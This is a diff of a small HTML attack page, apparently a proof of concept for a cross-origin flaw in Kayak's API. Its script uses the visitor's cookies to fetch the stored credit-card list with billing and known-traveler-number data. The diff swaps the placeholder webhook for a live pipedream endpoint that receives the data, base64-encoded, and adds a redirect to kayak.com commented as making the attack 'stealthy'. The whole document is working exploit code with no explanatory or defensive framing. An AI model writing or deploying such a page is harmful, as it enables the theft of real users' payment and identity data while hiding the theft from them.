@@ -1,14 +1,23 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading...</title></head>
+<head><title>Redirecting...</title></head>
 <body>
 <script>
-  fetch("https://www.kayak.com/api/whisky/V1/cc/list", {
+  fetch("https://www.kayak.com/api/whisky/V1/cc/list?includeBilling=true&knownTravelerNumberApiVersion=v2", {
     method: "GET",
-    mode: "cors",
     credentials: "include"
   }).then(resp => resp.text())
-    .then(data => navigator.sendBeacon("https://your-webhook.com/?" + btoa(data)));
+    .then(data => {
+      navigator.sendBeacon(
+        "https://eoh3rxe2o8pbhuj.m.pipedream.net",
+        new URLSearchParams({ ccdata: btoa(data) })
+      );
+    });
+
+  // Optional: redirect to make it stealthy
+  setTimeout(() => {
+    window.location.href = "https://www.kayak.com";
+  }, 2000);
 </script>
 </body>
 </html>
